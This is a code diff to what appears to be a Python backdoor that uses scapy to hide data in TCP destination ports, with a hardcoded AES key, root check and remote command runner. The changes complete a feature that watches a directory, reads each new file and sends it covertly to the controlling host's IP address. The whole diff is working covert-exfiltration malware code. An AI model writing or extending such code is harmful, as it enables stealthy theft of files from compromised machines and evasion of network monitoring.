@@ -3,22 +3,33 @@ import base64
 import argparse
 import collections
 import logging
+import binascii
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 from subprocess import *
+from time import sleep
 from watchdog.observers import Observer
 from watchdog.events import FileSystemEventHandler
 from random import randint
 from Crypto.Cipher import AES
 CONN_IPS = collections.defaultdict(list)
 CMDS = collections.defaultdict(list)
+MONITOR = 0
 
 MASTER_KEY = "CorrectHorseBatteryStapleGunHead"
 
 
 class NewFileHandler(FileSystemEventHandler):
+
+	def __init__(self, packet):
+		self.packet = packet
+
 	def on_created(self, event):
-		raise Exception("new", event.srcpath)
+		global MONITOR
+		filename = os.path.basename(event.src_path)
+		f_binary = file_to_binary(filename, event.src_path)
+		send_msg(f_binary, self.packet[1].src)
+		MONITOR = 1
 
 
 def encrypt_val(text):
@@ -40,8 +51,10 @@ def verify_root():
 		exit("This program must be run with root/sudo")
 
 
-def file_to_binary(file, header):
-	byte = header + file.read()
+def file_to_binary(file, path):
+	f = open(path, "rb")
+	header = file + '\0'
+	byte = header + f.read()
 	binary = list(bin(int('1'+binascii.hexlify(byte), 16))[3:].zfill(8))
 	binary = ''.join(binary)
 	byte_list = [binary[i:i+8] for i in range(0, len(binary), 8)]
@@ -51,14 +64,14 @@ def file_to_binary(file, header):
 def data_packet(dest, val1, val2=None):
 	if(len(val1) == 1):
 		if(val2 is None):
-			destport = ord(char1) << 8
+			destport = ord(val1) << 8
 		else:
-			destport = (ord(char1) << 8) + ord(char2)
+			destport = (ord(val1) << 8) + ord(val2)
 	else:
 		if(val2 is None):
-			destport = int(bin1, 2)
+			destport = int(val1, 2)
 		else:
-			destport = int(bin1 + bin2, 2)
+			destport = int(val1 + val2, 2)
 	return IP(dst=dest) / TCP(sport=80, dport=destport)
 
 
@@ -103,20 +116,15 @@ def run_cmd(packet, cmd):
 
 
 def watch_dir(packet, path):
-	event_handler = NewFileHandler()
+	path = path.rstrip('\0')
+	event_handler = NewFileHandler(packet)
 	observer = Observer()
 	observer.schedule(event_handler, path, recursive=False)
 	observer.start()
 
-	try:
-		while True:
-			sleep(1)
-	except Exception as e:
-		if(e.args[0] == "new"):
-			observer.stop()
-			f_binary = file_to_binary(e.args[1])
-			send_msg(f_binary, packet[2].src)
-			return
+	while MONITOR == 0:
+		sleep(1)
+	observer.stop()
 	observer.join()
 
 
